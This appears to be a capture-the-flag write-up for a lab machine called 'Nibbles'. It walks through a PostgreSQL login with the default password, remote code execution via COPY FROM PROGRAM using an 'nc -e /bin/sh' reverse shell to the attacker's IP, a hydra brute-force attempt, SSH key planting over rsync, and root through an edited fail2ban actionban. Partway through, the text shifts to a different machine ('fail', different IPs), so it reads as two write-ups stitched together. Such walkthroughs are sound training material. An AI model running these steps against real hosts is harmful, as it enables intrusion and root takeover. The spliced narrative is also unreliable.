---
layout: post
title: PG | Nibbles
subtitle: This machine will highlight why we have hardening guidelines.
---

# Nmap Scan Results

~~~
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 09:34 UTC
Nmap scan report for 192.168.191.47
Host is up (0.014s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.81 seconds
~~~

# Service Enumeration

## HTTP (TCP/80)
The target machine is running an Apache web server on port 80

INS IMG 1

After digging around the contents of the website and running a gobuster sub-directory scan there was no significant entry point for a foothold

INS IMG 2

## PostgreSQL (TCP/5437)

PostgreSQL is a relational database management system software commonly used on Unix systems.

I first attempted to connect to postgres using the default username of "postgres" and a null password, however it prompted for password authentication

~~~shell
┌──(kali㉿kali)-[~/Desktop/Nibbles]
└─$ psql -h 192.168.191.47 -U postgres -p 5437
Password for user postgres: 
psql: error: connection to server at "192.168.191.47", port 5437 failed: fe_sendauth: no password supplied
~~~

I then attempted a few manual password attempts of "password" and "postgres", and postgres was the password!

~~~shell
┌──(kali㉿kali)-[~/Desktop/Nibbles]
└─$ psql -h 192.168.191.47 -U postgres -p 5437
Password for user postgres: 
psql (16.0 (Debian 16.0-2), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# 

~~~

I then enumerated the available databases using "\l" cmdlet and listed our user's privileges via "\du+" which showed we have Superuser privileges

~~~shell
┌──(kali㉿kali)-[~/Desktop/Nibbles]
└─$ psql -h 192.168.191.47 -U postgres -p 5437
Password for user postgres: 
psql (16.0 (Debian 16.0-2), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                       List of databases
   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
           |          |          |                 |             |             |            |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
           |          |          |                 |             |             |            |           | postgres=CTc/postgres
(3 rows)

postgres=# \du+
                                    List of roles
 Role name |                         Attributes                         | Description 
-----------+------------------------------------------------------------+-------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | 
~~~

After researching I found a way to read directories and files by creating a database table and populating it with data on the targets local filesystem, which identified a user on the system named 'wilson'
https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql

INSIMG3

I then ran a hydra password brute force attempt on the wilson user account through the FTP service, but had no success so decided to dig deeper into what Superusers can do.
~~~shell
┌──(kali㉿kali)-[/usr/share/seclists/Passwords/Common-Credentials]
└─$ hydra -l wilson -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ftp://192.168.191.47
~~~

I found a RCE(https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) exploit that works for Superusers on PostgreSQL version 9.3+ and used it to execute a reverse shell

Create listener on port 80

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 80
listening on [any] 80 ...
~~~

Perform RCE
~~~shell
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'nc -e /bin/sh 192.168.45.173 80';
~~~

And we recieved our reverse shell foothold!
~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.173] from (UNKNOWN) [192.168.191.47] 42184

whoami
postgres
~~~

The contents of the fox folder can be retrieved and stored locally using the command
~~~shell
rsync -av rsync://192.168.194.126/fox ./rsyn_shared
~~~
These files reveal no useful information to further our progress.

Rsync also allows us to upload files, therefore we can generate a SSH key (as we have seen SSH TCP port 22 is enabled), then upload to the key to the machine using Rsync to
give us a remote connection to the machine.

# Exploitation

Generate SSH Key
~~~shell
┌──(kali㉿kali)-[~/Desktop/Fail]
└─$ ssh-keygen                                       
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:LvQfnvR+8TxNBfJBl+4vlOWFvrQu5HBkN6lzYPVXszk kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|             .. o|
|            . ++.|
|             +.*=|
|            = *E*|
|      . S  + =.==|
|     . o  . = B.o|
|      . o o= = Bo|
|       . + +o =.=|
|          +.o+...|
+----[SHA256]-----+
~~~

Copy our .ssh directory locally
~~~shell
cp -R /home/kali/.ssh .
~~~

Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
~~~shell
┌──(kali㉿kali)-[~/Desktop/Fail]
└─$ cd .ssh
┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
└─$ mv id_rsa.pub authorized_keys
~~~

Upload the .ssh file (containing authorized_keys) to Rsync
~~~shell
rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
~~~

SSH into the target machine
~~~shell
┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
└─$ ssh -i ./id_rsa fox@192.168.194.126
The authenticity of host '192.168.194.126 (192.168.194.126)' can't be established.
ED25519 key fingerprint is SHA256:mqPCrimr9j626KOGoHM+qxgHUOYD4pu1+4KzhIvu5uA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:37: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.194.126' (ED25519) to the list of known hosts.
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
$ 
~~~

# Privilege Escalation

After running Linpeas.sh a directory /etc/fail2ban was identified which is writable by our user

~~~shell
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                            
  Group fail2ban:                                                                                                                                                            
/etc/fail2ban/action.d                                                                                                                                                       
/etc/fail2ban/action.d/firewallcmd-ipset.conf
/etc/fail2ban/action.d/nftables-multiport.conf
/etc/fail2ban/action.d/firewallcmd-multiport.conf
/etc/fail2ban/action.d/mail-whois.conf
/etc/fail2ban/action.d/ufw.conf
You_can_write_even_more_files_inside_last_directory
~~~

A manual verification of this vulnerability was ran which identified full Read, Write, Execute (RWX) permissions over a file named action.d which is ran by Root

~~~shell
$ find /etc -writable -ls 2>/dev/null
   787482      4 drwxrwxr-x   2 root     fail2ban     4096 Dec  3  2020 /etc/fail2ban/action.d
~~~

After researching exploits for Fail2Ban an exploit I discovered an exploit within /etc/fail2ban/jail.conf [Exploit](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)

Inspecting /etc/fail2ban/jail.conf shows that Fail2Ban is configured to only allow 2 attempts before performing the banaction (maxretry) as shown below

![Fail](/assets/img/FailPG(1).png)

Further down it shows the banaction executes iptables-multiport, we have read-write permissions over iptables-multiport.conf as shown below

![Fail](/assets/img/FailPG(2).png)

![Fail](/assets/img/FailPG(3).png)

We then change the iptables-multiport.conf file's actionban= to include a reverse shell

Before

![Fail](/assets/img/FailPG(4).png)

After

![Fail](/assets/img/FailPG(5).png)

Start a listener on port 80

Attempt to log in with invalid credentials to execute the Fail2Ban and execute our reverse shell
~~~shell
┌──(kali㉿kali)-[~]
└─$ ssh root@192.168.194.126                    
root@192.168.194.126's password: 
Permission denied, please try again.
root@192.168.194.126's password: 
Permission denied, please try again.
root@192.168.194.126's password: 
root@192.168.194.126: Permission denied (publickey,password).
~~~
We then recieve our root shell on the netcat listener on port 80

![Fail](/assets/img/FailPG(6).png)
